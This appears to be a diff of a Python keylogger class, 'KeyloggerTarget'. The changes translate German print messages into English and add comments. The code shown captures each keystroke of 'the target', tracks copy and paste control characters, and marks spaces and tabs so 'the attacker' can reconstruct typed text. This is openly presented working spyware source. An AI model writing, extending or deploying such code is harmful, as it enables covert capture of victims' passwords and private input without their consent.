@@ -204,7 +204,7 @@ class KeyloggerTarget:
         self.richtige_liste.append(data)
 
     def print_work(self, word):
-        print(f'Alphabetische Taste wurde gedrückt: {word} ')
+        print(f'Alphabetic key was pressed: {word} ')
         self.richtige_liste += word
         # Every pressed key will be saved in "richtige_liste" this is a german word and means "right_list"
 
@@ -223,15 +223,21 @@ class KeyloggerTarget:
                     word = key.char
 
                 all_req_keys = {"": self.copy_data, "": self.append_paste}
+                # "ETX" stands for "End-Text-character" and is a control character which knows the character of copying something on the keyboard
+                # "SYN" stands for "Synchronous Idle" and is a control character which knows the character of pasting something on the keyboard
                 for each_key in all_req_keys:
                     if each_key == key.char:
+                        # If the copy character is pressed, each function of each character will be working
                         all_req_keys[each_key]()
                 try:
                     asci_number = ord(word)
+                    # Ordinal number in the range of 0 to 31 completes all special characters with the key "strg + letter"
                     if asci_number not in range(0, 32):
+                        # if there is no special character it just prints the alphabetic number
                         self.print_work(word)
 
                 except TypeError:
+                    # prints the alphabetc number
                     self.print_work(word)
 
                 print(self.richtige_liste)
@@ -239,7 +245,7 @@ class KeyloggerTarget:
                 pass
 
         except AttributeError:
-            print(f'Eine andere Taste wurde gedrückt: {key}')
+            print(f'An other key was pressed: {key}')
             if key == keyboard.Key.space or key == keyboard.Key.tab:
                 self.richtige_liste += "{"
                 # If the target presses tab or space a "{" will be appended to the list so the attacker knows when and
